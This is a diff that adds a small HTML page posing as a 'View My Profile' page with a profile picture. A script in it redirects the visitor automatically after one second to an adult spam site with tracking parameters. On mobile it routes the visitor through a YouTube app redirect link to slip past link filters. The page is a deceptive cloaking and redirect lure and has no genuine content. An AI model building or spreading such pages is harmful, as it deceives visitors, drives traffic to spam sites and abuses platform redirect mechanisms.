@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://drive.google.com/uc?id=1R1Dfp9TFBR3Iwn37aSHFnuxwpSrF24R2">
+<link rel="icon" href="https://drive.google.com/uc?id=1WjCSq4fTYy7w_cyh4KOevabvv_ODVNre" />
+<link rel="apple-touch-icon" href="https://drive.google.com/uc?id=1g1vTYMn1wyF9ZwF0aHzhnGNicVfYi3E-" />
+<title>View My Profile</title>
+
+</head>
+
+<body>
+  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
+  <button onclick="myFunction()">View my profile</button>
+<script>
+    setTimeout(function() {
+      myFunction();
+    }, 1000);
+    
+    function myFunction() {
+      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqblF2NElaYklHNTVfc18tTmZ5UXNUdVRtMzNZZ3xBQ3Jtc0tud2I4cTN2NDd1aXVMSktOZ0dNM0N3UEJtRzctM3lZTUVKYkczNk9hbUozUTh3QVAwZFlQSl8wVFVCY1FDQnhGSzFKdmdGem1xWWtFRHJ6UVFsQXZSY01QZVBoNGt0OEcxSmZrQXBaMERuOXJfak92Zw&q=https%3A%2F%2Fsnapbabes2.com%2F%3Futm_source%3DJEtZ91DudqZiE%26utm_campaign%3DMs_nayemssshb&html_redirect=1";
+      
+      var fallback = "https://snapbabes2.com/?utm_source=JEtZ91DudqZiE&utm_campaign=Ms_nayemssshb";
+
+      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+          window.location = app;
+          window.setTimeout(function() {
+              window.location = fallback;
+          }, 25);
+      } else {
+          window.location = fallback;
+      }
+
+      function killPopup() {
+          window.removeEventListener('pagehide', killPopup);
+      }
+
+      window.addEventListener('pagehide', killPopup);
+    }
+</script>
+</body>
+</html>
